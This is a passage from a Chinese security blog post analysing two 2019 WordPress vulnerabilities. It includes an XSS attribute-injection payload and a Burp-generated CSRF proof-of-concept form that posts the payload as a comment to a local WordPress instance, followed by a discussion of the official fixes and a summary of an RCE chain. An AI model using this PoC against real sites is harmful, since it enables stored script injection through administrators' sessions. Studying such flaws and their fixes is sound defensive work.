<p>&emsp;&emsp;假设我们构造下面内容<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">title</span>=<span class="string">'l1nk3r " onmouseover=alert(111) id=" '</span> <span class="attr">rel</span>=<span class="string">'111'</span>&gt;</span>please click me</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;那么这里通过替换取值之后就变成了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">title</span>=<span class="string">"l1nk3r "</span> <span class="attr">onmouseover</span>=<span class="string">alert(111)</span> <span class="attr">id</span>=<span class="string">" "</span> <span class="attr">rel</span>=<span class="string">'111'</span>&gt;</span>please click me</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;最后CSRF poc如下所示<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/wordpress/wp-comments-post.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"comment"</span> <span class="attr">value</span>=<span class="string">"&amp;lt;a&amp;#32;title&amp;#61;&amp;apos;l1nk3r&amp;#32;&amp;quot;&amp;#32;onmouseover&amp;#61;alert&amp;#40;111&amp;#41;&amp;#32;id&amp;#61;&amp;quot;&amp;#32;&amp;apos;&amp;#32;rel&amp;#61;&amp;apos;111&amp;apos;&amp;gt;please&amp;#32;click&amp;#32;me"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"�&amp;#143;&amp;#145;�&amp;#161;&amp;#168;�&amp;#175;&amp;#132;�&amp;#174;�"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"comment&amp;#95;post&amp;#95;ID"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"comment&amp;#95;parent"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"&amp;#95;wp&amp;#95;unfiltered&amp;#95;html&amp;#95;comment"</span> <span class="attr">value</span>=<span class="string">"2"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="http://l1nk3r.xmutsec.com/blog/jsv8c.png" alt=""></p>
<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>&emsp;&emsp;首先wordpress在xss漏洞上，使用 <strong>esc_attr</strong> 进行过滤。<br><img src="http://l1nk3r.xmutsec.com/blog/48h5y.png" alt=""><br>&emsp;&emsp;然后针对第二个问题，我们通过CSRF在超级管理员的权限下注入<code>&lt;a&gt;</code>标签，并且携带 <strong>rel</strong> 字段，官方是通过remove_filter方法去掉<strong>wp_filter_post_kses</strong> ，替换上 <strong>wp_filter_kses</strong> ，原因在于 <strong>wp_filter_kses</strong> 方法是不支持 <strong>rel</strong> 字段的。<br><img src="http://l1nk3r.xmutsec.com/blog/0vckd.png" alt=""></p>
<p>##0x03 小结<br>&emsp;&emsp;首先第一个洞<code>WordPress 5.0.0 Remote Code Execution</code>，它的触发流程：<br>媒体库上传图片-&gt;通过POST发送<code>meta_input[_wp_attached_file]</code>修改数据库中的相关字段-&gt;通过文件剪裁调用<code>wp_ajax_crop_img</code>达到目录穿越-&gt;通过<code>_wp_page_template</code>达到文件包含<br>&emsp;&emsp;另一个洞<code>WordPress 5.1 CSRF to Remote Code Execution</code>，这个洞本质上是个xs，因为wordpress是允许超级管理员自定义修改php文件，所以这标题来看，rips也是个标题党。</p>
<p>##0x04 Reference<br><a href="https://paper.seebug.org/825/" target="_blank" rel="noopener">Wordpress 5.0.0 远程代码执行漏洞分析与复现</a><br><a href="https://github.com/WordPress/WordPress/commit/2504efcf9439c1961c4108057e8f3f48239a244b#diff-e7c589fb0969e0f690bf2f051517d0ad" target="_blank" rel="noopener">Formatting: Improve rel=”nofollow” handling in comments.</a><br><a href="https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b#diff-91531896c6f70c8a4b4b321d1369c988" target="_blank" rel="noopener">Improve comment content filtering.</a><br><a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce/" target="_blank" rel="noopener">WordPress 5.1 CSRF to Remote Code Execution</a></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/Friends/">Friends</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、WordPress-5-0-0-Remote-Code-Execution"><span class="toc-number">2.1.</span> <span class="toc-text">一、WordPress 5.0.0 Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、变量控制"><span class="toc-number">2.1.1.</span> <span class="toc-text">1、变量控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、目录穿越"><span class="toc-number">2.1.2.</span> <span class="toc-text">2、目录穿越</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、文件包含"><span class="toc-number">2.1.3.</span> <span class="toc-text">3、文件包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、WordPress-5-1-CSRF-to-Remote-Code-Execution"><span class="toc-number">2.2.</span> <span class="toc-text">二、WordPress 5.1 CSRF to Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.2.1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞修复"><span class="toc-number">2.2.2.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&text=聊一聊近期wordpress的漏洞"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&is_video=false&description=聊一聊近期wordpress的漏洞"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=聊一聊近期wordpress的漏洞&body=Check out this article: http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&title=聊一聊近期wordpress的漏洞"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.lmxspace.com/2019/03/15/聊一聊近期wordpress的漏洞/&name=聊一聊近期wordpress的漏洞&description=&lt;h2 id=&#34;0x01-前言&#34;&gt;&lt;a href=&#34;#0x01-前言&#34; class=&#34;headerlink&#34; title=&#34;0x01 前言&#34;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;近期rips在博客上披露了两个关于wordpress的漏洞，一个是&lt;a href=&#34;https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WordPress 5.0.0 Remote Code Execution&lt;/a&gt;,另一个是&lt;a href=&#34;https://blog.ripstech.com/2019/wordpress-csrf-to-rce/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WordPress 5.1 CSRF to Remote Code Execution&lt;/a&gt;。由于之前工作的原因没有好好看这两个漏洞，所以今天过来学习一下。&lt;br&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 l1nk3r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
          <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


